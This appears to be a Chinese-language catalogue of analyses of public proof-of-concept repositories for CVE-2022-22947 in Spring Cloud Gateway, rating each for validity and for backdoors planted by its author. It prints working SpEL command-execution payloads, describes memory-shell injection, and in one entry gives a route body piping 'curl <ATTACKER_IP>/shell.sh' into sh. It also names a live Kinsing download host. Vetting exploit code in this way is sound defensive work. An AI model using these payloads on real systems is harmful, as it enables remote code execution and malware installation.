1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
